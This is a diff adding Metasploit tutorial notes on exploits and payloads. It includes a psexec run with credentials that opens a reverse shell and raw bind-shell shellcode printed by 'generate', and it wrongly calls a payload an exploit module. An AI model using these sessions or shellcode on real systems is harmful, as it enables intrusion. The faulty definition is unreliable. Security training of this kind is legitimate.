@@ -15,7 +15,7 @@
 
 -- Msfconsole --
 
-What is the MSFconsole?
+What is the MSFconsole
 MSFconsole is the primary, all-in-one command-line interface for the Metasploit Framework, giving centralized access to nearly all MSF features;
 
 Benefits to Benefits to Using MSFconsole
@@ -85,9 +85,288 @@ msf6 exploit(...) > back  # Exit the currently selected module and return to the
 
 -- Exploits --
 
+• Active Exploits
+• Passive Exploits
+• Exploit Module Example
+
+
+
+All exploits in the Metasploit Framework will fall into two categories: active and passive.
+
+- Active Exploits -
+
+Active exploits will exploit a specific host, run until completion, and then exit.
+• Brute-force modules will exit when a shell opens from the victim.
+• Module execution stops if an error is encountered.
+• You can force an active module to the background by passing '-j' to the exploit command:
+
+The following example makes use of a previously acquired set of credentials to exploit and gain a reverse shell on the target system.
+
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set RHOST 192.168.1.100
+RHOST => 192.168.1.100
+msf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp
+PAYLOAD => windows/shell/reverse_tcp
+msf exploit(psexec) > set LHOST 192.168.1.5
+LHOST => 192.168.1.5
+msf exploit(psexec) > set LPORT 4444
+LPORT => 4444
+msf exploit(psexec) > set SMBUSER victim
+SMBUSER => victim
+msf exploit(psexec) > set SMBPASS s3cr3t
+SMBPASS => s3cr3t
+msf exploit(psexec) > exploit
+
+[*] Connecting to the server...
+[*] Started reverse handler
+[*] Authenticating as user 'victim'...
+[*] Uploading payload...
+[*] Created \hikmEeEM.exe...
+[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ...
+[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ...
+[*] Obtaining a service manager handle...
+[*] Creating a new service (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD")...
+[*] Closing service handle...
+[*] Opening service...
+[*] Starting the service...
+[*] Removing the service...
+[*] Closing service handle...
+[*] Deleting \hikmEeEM.exe...
+[*] Sending stage (240 bytes)
+[*] Command shell session 1 opened (192.168.1.5:4444 -> 192.168.1.100:1073)
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+
+
+- Passive Exploits -
+
+Passive exploits wait for incoming hosts and exploit them as they connect.
+• Passive exploits almost always focus on clients such as web browsers, FTP clients, etc.
+• They can also be used in conjunction with email exploits, waiting for connections.
+• Passive exploits report shells as they happen can be enumerated by passing '-l' to the sessions command. Passing '-i' will interact with a shell.
+
+msf exploit(ani_loadimage_chunksize) > sessions -l
+
+Active sessions
+===============
+
+  Id  Description  Tunnel
+  --  -----------  ------
+  1   Meterpreter  192.168.1.5:52647 -> 192.168.1.100:4444
+
+msf exploit(ani_loadimage_chunksize) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter >
+
+
+-- Exploit Module Example --
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 -- Payloads --
+
+• Overview
+• Payload Types
+• Generating Payloads
+
+
+- Overview -
+
+What Does Payload Mean
+A payload in Metasploit refers to an exploit module. There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages. These different types allow for a great deal of versatility and can be useful across numerous types of scenarios. Whether or not a payload is staged, is represented by '/' in the payload name. For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).
+Payload modules are stored in the modules/payloads/{singles,stages,stagers}/<platform> directory.
+
+Singles
+Singles are payloads that are self-contained and completely standalone. A Single payload can be something as simple as adding a user to the target system or running calc.exe.
+These kinds of payloads are self-contained, so they can be caught with non-metasploit handlers such as netcat.
+
+Stagers
+Stagers setup a network connection between the attacker and victim and are designed to be small and reliable. It is difficult to always do both of these well so the result is multiple similar stagers. Metasploit will use the best one when it can and fall back to a less-preferred one when necessary.
+
+Windows NX vs NO-NX Stagers
+• Reliability issue for NX CPUs and DEP
+• NX stagers are bigger (VirtualAlloc)
+• Default is now NX + Win7 compatible
+
+Stages
+Stages are payload components that are downloaded by Stagers modules. The various payload stages provide advanced features with no size limits such as Meterpreter, VNC Injection, and the iPhone ‘ipwn’ Shell.
+
+Payload stages automatically use 'middle stagers'
+• A single recv() fails with large payloads
+• The stager receives the middle stager
+• The middle stager then performs a full download
+• Also better for RWX
+
+
+
+
+- Payload Types -
+
+
+
+
+
+- Generating Payloads -
+
+msf > use payload/windows/shell_bind_tcp
+msf payload(shell_bind_tcp) > help
+...snip...
+
+    Command       Description
+    -------       -----------
+    generate      Generates a payload
+    pry           Open a Pry session on the current module
+    reload        Reload the current module from disk
+
+
+Running it with the -h switch
+
+msf payload(shell_bind_tcp) > generate -h
+Usage: generate [options]
+
+Generates a payload.
+
+OPTIONS:
+
+    -E        Force encoding.
+    -b   The list of characters to avoid: '\x00\xff'
+    -e   The name of the encoder module to use.
+    -f   The output file name (otherwise stdout)
+    -h        Help banner.
+    -i   the number of encoding iterations.
+    -k        Keep the template executable functional
+    -o   A comma separated list of options in VAR=VAL format.
+    -p   The Platform for output.
+    -s   NOP sled length.
+    -t   The output format: raw,ruby,rb,perl,pl,c,js_be,js_le,java,dll,exe,exe-small,elf,macho,vba,vbs,loop-vbs,asp,war
+    -x   The executable template to use
+
+
+msf payload(shell_bind_tcp) > generate
+# windows/shell_bind_tcp - 341 bytes
+# http://www.metasploit.com
+# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
+# InitialAutoRunScript=, AutoRunScript=
+buf =
+"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
+"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
+"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
+"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" +
+"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" +
+"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" +
+"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" +
+"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" +
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" +
+"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" +
+"\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f" +
+"\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29" +
+"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50" +
+"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x31" +
+"\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68" +
+"\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff" +
+"\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7" +
+"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" +
+"\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44" +
+"\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56" +
+"\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86" +
+"\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60" +
+"\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5" +
+"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f" +
+"\x6a\x00\x53\xff\xd5"
+
+
+msf  payload(shell_bind_tcp) > generate -b '\x00'
+# windows/shell_bind_tcp - 368 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
+# InitialAutoRunScript=, AutoRunScript=
+buf =
+"\xdb\xde\xba\x99\x7c\x1b\x5f\xd9\x74\x24\xf4\x5e\x2b\xc9" +
+"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x8d\x9e\xee\xa3" +
+"\x45\xd7\x11\x5c\x95\x88\x98\xb9\xa4\x9a\xff\xca\x94\x2a" +
+"\x8b\x9f\x14\xc0\xd9\x0b\xaf\xa4\xf5\x3c\x18\x02\x20\x72" +
+"\x99\xa2\xec\xd8\x59\xa4\x90\x22\x8d\x06\xa8\xec\xc0\x47" +
+"\xed\x11\x2a\x15\xa6\x5e\x98\x8a\xc3\x23\x20\xaa\x03\x28" +
+"\x18\xd4\x26\
+...snip...
+
+
+msf  payload(shell_bind_tcp) > generate
+# windows/shell_bind_tcp - 341 bytes
+# http://www.metasploit.com
+# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
+...snip...
+
+msf  payload(shell_bind_tcp) > generate -b '\x00'
+# windows/shell_bind_tcp - 368 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+...snip...
+
+
+msf  payload(shell_bind_tcp) > generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'
+# windows/shell_bind_tcp - 366 bytes
+# http://www.metasploit.com
+# Encoder: x86/fnstenv_mov
+# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
+# InitialAutoRunScript=, AutoRunScript=
+buf =
+"\x6a\x56\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xbf" +
+"\x5c\xbf\xe8\x83\xeb\xfc\...
+...snip...
+
+
+Payload Generation Failed
+
+msf  payload(shell_bind_tcp) > generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26'
+[-] Payload generation failed: No encoders encoded the buffer successfully.
+
+
+
+
+
+
 
 
 
